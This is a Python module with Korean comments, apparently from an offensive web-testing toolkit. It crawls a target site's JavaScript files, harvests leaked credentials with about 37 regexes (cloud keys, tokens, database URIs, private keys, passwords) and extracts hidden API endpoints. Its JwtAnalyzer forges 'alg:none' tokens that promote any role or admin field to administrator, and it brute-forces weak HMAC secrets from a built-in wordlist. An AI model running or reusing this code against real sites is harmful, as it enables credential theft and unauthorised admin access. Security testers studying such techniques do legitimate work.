"""bingo/tools/js_secret_finder.py — JS 소스 분석 + 숨겨진 API/시크릿 탐지 (v2.9.0)

기능:
  - 모든 JS 파일 자동 수집
  - 50+ 시크릿 패턴 탐지 (API키, JWT, OAuth, DB패스워드 등)
  - 숨겨진 API 엔드포인트 추출
  - JWT 시크릿 추출 → 자동 위조 시도
  - 하드코딩 자격증명 탐지
  - .env / config.js 노출 탐지
"""
from __future__ import annotations

import base64
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class SecretFinding:
    js_url: str
    secret_type: str
    secret_value: str
    line_hint: str = ""
    severity: str = "HIGH"
    exploit_hint: str = ""


@dataclass
class EndpointFinding:
    js_url: str
    endpoint: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    requires_auth: bool = False


@dataclass
class JsAnalysisReport:
    target: str
    js_urls: list[str] = field(default_factory=list)
    secrets: list[SecretFinding] = field(default_factory=list)
    endpoints: list[EndpointFinding] = field(default_factory=list)
    jwt_findings: list[dict] = field(default_factory=list)

    def summary(self) -> str:
        lines = [
            f"[JS ANALYZER] {self.target}",
            f"  JS파일: {len(self.js_urls)}개 | 시크릿: {len(self.secrets)}개 | 엔드포인트: {len(self.endpoints)}개",
        ]
        for s in self.secrets[:10]:
            lines.append(f"  [{s.secret_type:25}] {s.secret_value[:60]}...")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 시크릿 패턴 목록 (50+)
# ══════════════════════════════════════════════════════════════════════════════

SECRET_PATTERNS: list[tuple[str, str, str]] = [
    # (type, regex, severity)
    # AWS
    ("aws_access_key",      r"AKIA[0-9A-Z]{16}",                                "CRITICAL"),
    ("aws_secret_key",      r"(?i)aws[_\-.]?secret[_\-.]?(?:access[_\-.]?)?key['\"\s:=]+([A-Za-z0-9/+=]{40})", "CRITICAL"),
    ("aws_session_token",   r"AQoD[A-Za-z0-9/+=]{50,}",                         "CRITICAL"),
    # Google
    ("google_api_key",      r"AIza[0-9A-Za-z\-_]{35}",                          "HIGH"),
    ("google_oauth",        r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com", "HIGH"),
    ("firebase_url",        r"https://[a-z0-9-]+\.firebaseio\.com",             "MEDIUM"),
    # JWT
    ("jwt_token",           r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*", "HIGH"),
    ("jwt_secret",          r"(?i)jwt[_\-.]?secret['\"\s:=]+(['\"]?)([A-Za-z0-9@#$%^&*!_\-]{8,})\1", "CRITICAL"),
    # Generic API Keys
    ("api_key",             r"(?i)api[_\-.]?key['\"\s:=]+(['\"]?)([A-Za-z0-9\-_]{20,})\1", "HIGH"),
    ("api_secret",          r"(?i)api[_\-.]?secret['\"\s:=]+(['\"]?)([A-Za-z0-9\-_]{20,})\1", "HIGH"),
    ("auth_token",          r"(?i)auth[_\-.]?token['\"\s:=]+(['\"]?)([A-Za-z0-9\-_]{20,})\1", "HIGH"),
    ("bearer_token",        r"(?i)bearer\s+([A-Za-z0-9\-_=.]{20,})",           "HIGH"),
    # Database
    ("db_password",         r"(?i)(?:db|database)[_\-.]?pass(?:word)?['\"\s:=]+(['\"]?)([^\s'\"]{6,})\1", "CRITICAL"),
    ("mysql_uri",           r"mysql://[^'\"\s]+",                               "CRITICAL"),
    ("postgres_uri",        r"postgres(?:ql)?://[^'\"\s]+",                     "CRITICAL"),
    ("mongodb_uri",         r"mongodb(?:\+srv)?://[^'\"\s]+",                   "CRITICAL"),
    ("redis_url",           r"redis://[^'\"\s]+",                               "HIGH"),
    # Private Keys
    ("rsa_private_key",     r"-----BEGIN (?:RSA )?PRIVATE KEY-----",            "CRITICAL"),
    ("ec_private_key",      r"-----BEGIN EC PRIVATE KEY-----",                  "CRITICAL"),
    ("pgp_private_key",     r"-----BEGIN PGP PRIVATE KEY BLOCK-----",           "CRITICAL"),
    # Cloud / SaaS
    ("stripe_secret",       r"sk_live_[0-9a-zA-Z]{24}",                        "CRITICAL"),
    ("stripe_pub",          r"pk_live_[0-9a-zA-Z]{24}",                        "MEDIUM"),
    ("sendgrid_key",        r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",    "HIGH"),
    ("twilio_sid",          r"AC[a-z0-9]{32}",                                  "HIGH"),
    ("slack_token",         r"xox[baprs]-[0-9A-Za-z\-]{10,}",                  "HIGH"),
    ("slack_webhook",       r"https://hooks\.slack\.com/services/[A-Z0-9/]+",  "MEDIUM"),
    ("github_token",        r"ghp_[A-Za-z0-9]{36}",                            "HIGH"),
    ("github_oauth",        r"gho_[A-Za-z0-9]{36}",                            "HIGH"),
    ("gitlab_token",        r"glpat-[A-Za-z0-9\-]{20}",                        "HIGH"),
    ("twitter_key",         r"(?i)twitter[_\-.]?(?:api[_\-.]?)?(?:key|secret)['\"\s:=]+([A-Za-z0-9]{25,})", "MEDIUM"),
    # Generic credentials
    ("password",            r"(?i)password['\"\s:=]+(['\"]?)([^\s'\"]{8,})\1", "HIGH"),
    ("secret",              r"(?i)secret['\"\s:=]+(['\"]?)([A-Za-z0-9@#$%^&*!_\-]{8,})\1", "HIGH"),
    ("admin_password",      r"(?i)admin[_\-.]?pass(?:word)?['\"\s:=]+(['\"]?)([^\s'\"]{6,})\1", "CRITICAL"),
    # Korean specific
    ("korean_admin_key",    r"(?i)관리자[_\-.]?(?:키|key|암호|패스)['\"\s:=]+([^\s'\"]{6,})", "HIGH"),
    # Endpoints hidden
    ("internal_api",        r"(?i)/(?:internal|private|secret|hidden|debug|dev)/[a-z0-9/_-]+", "MEDIUM"),
    # Misc
    ("encryption_key",      r"(?i)encrypt(?:ion)?[_\-.]?key['\"\s:=]+(['\"]?)([A-Za-z0-9+/=]{16,})\1", "HIGH"),
    ("hmac_key",            r"(?i)hmac[_\-.]?(?:key|secret)['\"\s:=]+(['\"]?)([A-Za-z0-9+/=]{16,})\1", "HIGH"),
]


# ══════════════════════════════════════════════════════════════════════════════
# API 엔드포인트 추출 패턴
# ══════════════════════════════════════════════════════════════════════════════

ENDPOINT_PATTERNS = [
    r'["\'`](/api/v\d+[^\s"\'`]*)',
    r'["\'`](/api/[a-z][a-z0-9/_-]+)',
    r'["\'`](/v\d+/[a-z][a-z0-9/_-]+)',
    r'axios\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']',
    r'fetch\(["\']([^"\']+)["\']',
    r'\$\.(?:get|post|ajax)\(["\']([^"\']+)["\']',
    r'XMLHttpRequest.*open\(["\'](?:GET|POST)["\'][,\s]+["\']([^"\']+)["\']',
    r'baseURL\s*[=:]\s*["\']([^"\']+)["\']',
    r'BASE_URL\s*[=:]\s*["\']([^"\']+)["\']',
    r'API_URL\s*[=:]\s*["\']([^"\']+)["\']',
    r'endpoint\s*[=:]\s*["\']([^"\']+)["\']',
    r'url\s*[=:]\s*["\']([/][^"\']+)["\']',
]


# ══════════════════════════════════════════════════════════════════════════════
# JWT 분석 + 위조
# ══════════════════════════════════════════════════════════════════════════════

class JwtAnalyzer:
    """JWT 토큰 분석 및 취약점 탐지"""

    @staticmethod
    def decode_jwt(token: str) -> dict:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        try:
            header = json.loads(base64.b64decode(parts[0] + "=="))
            payload = json.loads(base64.b64decode(parts[1] + "=="))
            return {"header": header, "payload": payload, "signature": parts[2]}
        except Exception:
            return {}

    @staticmethod
    def alg_none_attack(token: str) -> str:
        """alg:none 공격 — 서명 없이 관리자 토큰 위조"""
        parts = token.split(".")
        if len(parts) != 3:
            return token
        try:
            header = json.loads(base64.b64decode(parts[0] + "=="))
            payload = json.loads(base64.b64decode(parts[1] + "=="))
        except Exception:
            return token

        header["alg"] = "none"
        # 관리자로 승격
        for k in ["role", "roles", "admin", "isAdmin", "is_admin", "type", "usertype"]:
            if k in payload:
                payload[k] = "admin" if isinstance(payload[k], str) else True

        new_header = base64.b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
        new_payload = base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
        return f"{new_header}.{new_payload}."

    @staticmethod
    def weak_secret_crack(token: str, wordlist: list[str] | None = None) -> str | None:
        """약한 JWT 시크릿 크래킹"""
        import hmac as hmac_mod
        import hashlib
        parts = token.split(".")
        if len(parts) != 3:
            return None
        message = f"{parts[0]}.{parts[1]}".encode()
        sig = base64.b64decode(parts[2] + "==")
        common_secrets = wordlist or [
            "secret", "secret123", "password", "jwt_secret",
            "mysecret", "your_secret", "admin", "key", "test",
            "jwtkey", "12345678", "qwerty", "letmein", "changeme",
        ]
        for candidate in common_secrets:
            computed = hmac_mod.new(candidate.encode(), message, hashlib.sha256).digest()
            if computed == sig:
                return candidate
        return None


# ══════════════════════════════════════════════════════════════════════════════
# JS 수집기
# ══════════════════════════════════════════════════════════════════════════════

class JsCollector:
    """HTML 페이지에서 JS 파일 URL 수집"""

    @staticmethod
    def extract_js_urls(html: str, base_url: str) -> list[str]:
        urls = []
        base = re.match(r"(https?://[^/]+)", base_url)
        base_domain = base.group(1) if base else ""

        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.IGNORECASE):
            js_url = m.group(1)
            if js_url.startswith("http"):
                urls.append(js_url)
            elif js_url.startswith("//"):
                urls.append("https:" + js_url)
            elif js_url.startswith("/"):
                urls.append(base_domain + js_url)
            elif base_url:
                urls.append(base_url.rstrip("/") + "/" + js_url)
        return list(dict.fromkeys(urls))


# ══════════════════════════════════════════════════════════════════════════════
# 메인 JS 시크릿 파인더
# ══════════════════════════════════════════════════════════════════════════════

class JsSecretFinder:
    """JS 파일 분석으로 시크릿/API/엔드포인트 자동 탐지"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
    ) -> None:
        self.req = request_fn

    def scan_content(self, js_url: str, content: str) -> tuple[list[SecretFinding], list[EndpointFinding]]:
        secrets = []
        endpoints = []

        # 시크릿 탐지
        for secret_type, pattern, severity in SECRET_PATTERNS:
            for m in re.finditer(pattern, content):
                value = m.group(0)[:200]
                exploit_hint = ""
                if secret_type == "jwt_token":
                    decoded = JwtAnalyzer.decode_jwt(value)
                    if decoded:
                        forged = JwtAnalyzer.alg_none_attack(value)
                        exploit_hint = f"alg:none forged → {forged[:60]}..."
                secrets.append(SecretFinding(
                    js_url=js_url,
                    secret_type=secret_type,
                    secret_value=value,
                    severity=severity,
                    exploit_hint=exploit_hint,
                ))

        # 엔드포인트 탐지
        for pattern in ENDPOINT_PATTERNS:
            for m in re.finditer(pattern, content, re.IGNORECASE):
                ep = m.group(1) if m.lastindex else m.group(0)
                if len(ep) > 3 and not ep.startswith("//"):
                    endpoints.append(EndpointFinding(js_url=js_url, endpoint=ep))

        return secrets, endpoints

    def analyze_page(self, url: str) -> JsAnalysisReport:
        report = JsAnalysisReport(target=url)
        _, html = self.req(url, "GET", {}, "")
        js_urls = JsCollector.extract_js_urls(html, url)
        report.js_urls = js_urls

        # 메인 HTML도 스캔
        secrets, endpoints = self.scan_content(url, html)
        report.secrets.extend(secrets)
        report.endpoints.extend(endpoints)

        # 각 JS 파일 스캔
        for js_url in js_urls[:30]:
            _, js_content = self.req(js_url, "GET", {}, "")
            if js_content:
                s, e = self.scan_content(js_url, js_content)
                report.secrets.extend(s)
                report.endpoints.extend(e)

        # JWT 분석
        for s in report.secrets:
            if s.secret_type == "jwt_token":
                decoded = JwtAnalyzer.decode_jwt(s.secret_value)
                cracked = JwtAnalyzer.weak_secret_crack(s.secret_value)
                report.jwt_findings.append({
                    "token": s.secret_value,
                    "decoded": decoded,
                    "cracked_secret": cracked,
                    "alg_none": JwtAnalyzer.alg_none_attack(s.secret_value),
                })

        # 중복 제거
        seen = set()
        unique_endpoints = []
        for e in report.endpoints:
            if e.endpoint not in seen:
                seen.add(e.endpoint)
                unique_endpoints.append(e)
        report.endpoints = unique_endpoints

        return report
